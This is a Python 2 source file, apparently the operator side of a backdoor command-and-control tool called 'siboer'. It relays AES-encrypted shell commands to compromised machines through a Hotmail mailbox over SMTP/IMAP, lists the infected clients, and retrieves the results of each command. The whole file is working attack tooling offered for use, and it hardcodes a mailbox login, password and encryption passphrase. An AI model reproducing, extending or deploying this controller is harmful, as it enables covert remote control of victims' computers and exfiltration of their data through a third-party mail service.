#-*- coding: utf8 -*-
##############################################
# 把信息加密传送到 hotmail， 
#从hotmail邮箱下载， 然后解密，然后分析信息
# 输出信息
##############################################
import argparse
import email
import imaplib
import base64
import string
import json
import random
import hashlib
import sys
import time

from base64 import b64decode
from smtplib import SMTP
from argparse import RawTextHelpFormatter
from email.MIMEMultipart import MIMEMultipart
from email.MIMEText import MIMEText
from Crypto.Cipher import AES
from Crypto import Random


##########################################
AESKEYS = 'this is a key lololo'
EMAIL_SERVER = 'smtp-mail.outlook.com'
IMA_EMAIL_SERVER = 'imap-mail.outlook.com'
EMAIL_PASSWORD = 'wangcai5388'
EMAIL_USERNAME = 'testforsiboer@hotmail.com'
SERVER_PORT = 587


##########################################

def generateJobID():
	return hashlib.sha256(''.join(random.sample(string.ascii_letters + string.digits,30))).hexdigest()

class InfoSecury:

	def __init__(self):
		self.bs = 32
		self.key = hashlib.sha256(AESKEYS).digest()

	def encrypt(self,plaintext):
		raw = self._pad(plaintext)
		iv = Random.new().read(AES.block_size)
		cipher = AES.new(self.key,AES.MODE_CBC,iv)
		return base64.b64encode(iv + cipher.encrypt(raw))

	def decrypt(self,ciphertext):
		enc = base64.b64decode(ciphertext)
		iv = enc[:AES.block_size]
		enc =enc[AES.block_size:len(enc)]
		cipher = AES.new(self.key,AES.MODE_CBC,iv)
		return self._unpad(cipher.decrypt(enc))

#填充字符 填充字符为 要填充的字符个数
	def _pad(self,s):
		return s + (self.bs - len(s) % self.bs)*chr(self.bs - len(s) % self.bs)
#unpad
	def _unpad(self, s):
		return s[:-ord(s[len(s)-1:])]

being_secure = InfoSecury()

class MessageParser:

	def __init__(self,msg_data):
		self.getDateHeader(msg_data)
		self.getSubjectHeader(msg_data)
		self.getPayloads(msg_data)

	def getPayloads(self,msg_data):
		payload = email.message_from_string(msg_data[1][0][1]).get_payload(None,True)
		data = being_secure.decrypt((payload))

		self.infodict =json.loads(json.loads(data))

	def getSubjectHeader(self,msg_data):
		self.subject = email.message_from_string(msg_data[1][0][1])['Subject']
	def getDateHeader(self,msg_data):
		self.date = email.message_from_string(msg_data[1][0][1])['Date']



class Siboer:

	def __init__(self):
		self.r = imaplib.IMAP4_SSL(IMA_EMAIL_SERVER,993)
		self.r.login(EMAIL_USERNAME,EMAIL_PASSWORD)

	def send_email(self,clientid,jobid,cmd,arg=''):

		if clientid is None or jobid is None:
			sys.exit("需要输入clientid 和 jobid")

		sub_header = 'siboer:{} {}'.format(clientid,jobid)
		msg = MIMEMultipart()
		msg['From'] = sub_header
		msg['To'] = EMAIL_USERNAME
		msg['Subject'] = sub_header
		msgtext = json.dumps({'cmd':cmd,'arg':arg})
		msg.attach(MIMEText(being_secure.encrypt(msgtext)))


		smtpServer = SMTP()
		smtpServer.connect(EMAIL_SERVER,SERVER_PORT)
		smtpServer.starttls()
		smtpServer.login(EMAIL_USERNAME,EMAIL_PASSWORD)
		smtpServer.sendmail(EMAIL_USERNAME,EMAIL_USERNAME, msg.as_string())

		smtpServer.close()

		print "命令成功发送 clientid:'{}' jobid: -jobid '{}'".format(clientid,jobid)

	def checkclients(self):
		clientids = []

		self.r.select('inbox')
		rcode,idlist = self.r.search(None,'(SUBJECT "This:")')
		for idm in idlist[0].split():
			data = self.r.fetch(idm,'(RFC822)')
			msg = MessageParser(data)
			clientid = str(msg.subject.split(":")[1])
			if clientid not in clientids:
				clientids.append(clientid)

		print clientids

	def getclientInfo(self,clientid):

		if clientid is None:
			sys.exit("你必须输入clientid ")

		self.r.select('inbox')
		rcode,idlist = self.r.search(None,'(SUBJECT "Client:{}")'.format(clientid))
		for idm in idlist[0].split():
			data = self.r.fetch(idm,'(RFC822)')
			msg = MessageParser(data)

			print "ClientID: " + str(clientid)
			print "Date: '{}'".format(msg.date)
			#print "PID: " + str(msg.infodict['pid'])
		#	print "OS: " + str(msg.infodict['os'])


	def getJobresults(self,clientid,jobid):
		if clientid is None or jobid is None:
			sys.exit("请输入clientid 和 jobid")

		self.r.select('inbox')
		rcode,idlist = self.r.search(None,'(SUBJECT "Client:{} {}")'.format(clientid,jobid))
		print idlist
		for idm in idlist[0].split():
			data = self.r.fetch(idm,'(RFC822)')
			msg = MessageParser(data)
			print "CLientID: " + str(clientid)
			print "JobID: " + str(jobid)
			print "CMD: {} ".format(msg.infodict["cmd"])
			print "-----"
			print msg.infodict['result'].encode('utf-8')


	def logout(self):
		self.r.logout()
if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='''
    	欢迎登陆siboer：
    	:)
    	1）-list	 得clientid 
    	2) -id ID -cmd CMD   得到 clientid 和 jobid 
    	3) -id ID -jobid CMD 取结果 
    	:) 
    	''',formatter_class=RawTextHelpFormatter)
    parser.add_argument('-id',dest='id',type=str,default=None,help="clientid")
    parser.add_argument('-jobid',dest='jobid',type=str,default=None,help='get results')

    parser.add_argument('-list',dest='list',action='store_true',help="列出放入后门的机器")
    parser.add_argument('-cmd',dest='cmd',type=str,help="执行一条系统命令")


    if len(sys.argv) is 1:
    	parser.print_help()
    	sys.exit()

    args = parser.parse_args()

    sibo = Siboer()
    jobid = generateJobID()

    if args.list:
    	sibo.checkclients()

    elif args.cmd:
    	sibo.send_email(args.id,jobid,'execCMD',args.cmd)

    elif args.jobid:
    	sibo.getJobresults(args.id,args.jobid)






    














